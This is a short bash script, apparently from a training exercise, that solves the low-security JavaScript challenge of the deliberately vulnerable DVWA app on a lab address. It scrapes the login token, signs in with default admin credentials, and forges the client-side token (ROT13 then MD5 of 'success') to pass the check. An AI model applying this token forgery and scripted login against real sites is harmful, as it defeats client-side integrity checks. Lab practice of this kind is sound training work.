#!/bin/bash

SECURITY="low" #security level in DVWA
USER="admin" #username to log in with
PASS="password" #password for selected user

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=$SECURITY" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID" {print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=$SECURITY" \
-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php


PHRASE="success" #phrase to submit

#ROT13 transformation using tr
ROT13=$(echo "$PHRASE" | tr 'A-Za-z' 'N-ZA-Mn-za-m')

#MD5 hash
TOKEN=$(echo -n "$ROT13" | md5sum | awk '{print $1}')

#sends request and saves result in local file
{
echo "Current security level: $SECURITY"
echo "Attempting to submit the word $PHRASE..."

RESPONSE=$(curl -s -X POST \
 -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
 -d "phrase=$PHRASE&token=$TOKEN&submit=Submit" \
http://192.168.56.105/DVWA/vulnerabilities/javascript/)

if echo "$RESPONSE" | grep -q "Well done!"; then
    echo "Attempt result -> SUCCESS!"
else
    echo "Attempt result -> FAILURE"
fi
}> /home/kali/javascript_low.log
